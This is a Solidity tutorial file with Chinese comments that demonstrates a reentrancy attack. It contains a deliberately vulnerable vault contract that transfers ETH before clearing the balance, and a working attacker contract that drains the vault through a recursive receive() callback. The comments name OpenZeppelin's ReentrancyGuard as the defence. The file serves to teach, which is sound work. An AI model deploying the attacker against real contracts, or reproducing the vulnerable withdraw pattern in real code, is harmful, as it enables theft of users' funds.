// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// 本节内容：重入攻击
// openzeppelin库中有ReentrancyGuard抽象合约，继承后，使用modifier nonReentrant修饰withdraw函数可以防止重入

// 当合约调用外部地址（如调用call转账），如果外部地址是一个合约，这个外部合约可以在未完成该此调用前（本合约的状态变量未修改前），反复回调本合约的函数，就会造成  重入攻击，导致资金被盗

/**
流程解析：
1、攻击合约调用attck方法，会先向受害者合约中存入1eth
2、随后攻击合约执行受害者合约中的withdraw方法进行提款
3、受害者合约的withdraw方法中调用call方法向攻击合约转帐，此时执行控制权发生转移到攻击者合约
4、攻击合约的receive函数接收转帐时，会继续递归调用受害者合约的withdraw方法
5、而此时，受害者合约的执行控制权暂停，等待攻击合约的receive返回，在这个过程中，攻击函数就可以一直withdraw，直到余额不足时结束receive返回
*/

// 攻击演示：受害合约
contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "no balance");

        // 发送eth（外部合约调用，容易被重入攻击）
        (bool success, ) = payable(msg.sender).call{
            value: balances[msg.sender]
        }("");
        require(success, "transfer failed");

        // 更新余额（防在调用后，导致重入漏洞）
        balances[msg.sender] = 0;
    }
}

// 攻击合约
contract Attacker {
    VulnerableVault public target;

    constructor(address addr) {
        target = VulnerableVault(addr);
    }

    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "< 1 eth");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}

contract ReentrancyAttack {}
